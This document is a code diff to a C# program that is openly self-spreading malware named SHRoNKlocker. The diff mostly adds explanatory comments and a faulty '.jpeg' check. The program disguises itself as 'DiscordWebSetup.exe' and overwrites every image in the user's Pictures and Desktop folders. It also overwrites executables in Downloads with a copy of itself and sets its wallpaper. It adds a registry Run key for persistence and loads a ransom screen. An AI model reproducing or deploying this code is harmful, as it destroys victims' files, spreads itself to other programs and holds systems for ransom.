@@ -43,7 +43,7 @@ namespace vector
                 string[] files = Directory.GetFiles(directory);
                 foreach (string file in files)
                 {
-                    if (file.EndsWith(".jpg") || file.EndsWith(".png") || file.EndsWith(".gif"))
+                    if (file.EndsWith(".jpg") || file.EndsWith(".png") || file.EndsWith(".gif") || file.EndsWith("*.jpeg"))
                     {
                         fileList.Add(file);
                     }
@@ -109,7 +109,7 @@ namespace vector
             string nsisExec = args[0];
             Log("EXECUTED FROM: ");
             Log(nsisExec);
-            File.Copy(nsisExec, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe"), true);
+            File.Copy(nsisExec, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe"), true); // make temp copy of self
             string homePath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
             directoriesToSearch.Add(homePath + "\\Pictures");
             directoriesToSearch.Add(homePath + "\\Desktop");
@@ -117,14 +117,18 @@ namespace vector
 
             directoriesToSearchExe.Add(homePath + "\\Downloads");
 
-            foreach (string directory in directoriesToSearch)
+            foreach (string directory in directoriesToSearch) // search for images
             {
                 searchDirImage(directory);
             }
-            foreach (string file in fileList)
+            foreach (string file in fileList) // replace images
             {
                 Log(file);
                 if (file.EndsWith(".jpg"))
+                {
+                    File.Copy("vector.jpg", file, true);
+                }
+                else if (file.EndsWith("*.jpeg"))
                 {
                     File.Copy("vector.jpg", file, true);
                 }
@@ -137,9 +141,9 @@ namespace vector
                     File.Copy("vector.gif", file, true);
                 }
             }
-            SetWallpaper(Path.GetFullPath(@"vector.jpg"));
+            SetWallpaper(Path.GetFullPath(@"vector.jpg")); // set wallpaper too
 
-            foreach (string directory in directoriesToSearchExe)
+            foreach (string directory in directoriesToSearchExe) // search for executables
             {
                 searchDirExe(directory);
             }
@@ -148,7 +152,7 @@ namespace vector
                 Log(file);
                 try
                 {
-                    File.Copy(nsisExec, file, true);
+                    File.Copy(nsisExec, file, true); // self replicate
                 }
                 catch (UnauthorizedAccessException)
                 {
@@ -160,9 +164,9 @@ namespace vector
                 }
 
             }
-            using (File.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "HasRun"))) { }
+            using (File.Create(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "HasRun"))) { } // stop payload on next run
 
-            if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe")))
+            if (File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe"))) // set to run ransom on boot
             {
                 RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                 add.SetValue("SHRoNKlocker", "\"" + Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp", "DiscordWebSetup.exe") + "\"");
@@ -176,10 +180,10 @@ namespace vector
             ApplicationConfiguration.Initialize();
             Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker"));
 
-            if(File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "HasRun")))
+            if(File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKlocker", "HasRun"))) // stop if run before
             {
                 Log("RUN BEFORE - LOAD RANSOM SCREEN");
-            } else if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKprotectz")))
+            } else if (Directory.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "SHRoNKprotectz"))) // stop if protected by SHRoNK AV
             {
                 Log("Quit - protected by SHRoNK");
                 Environment.Exit(0);
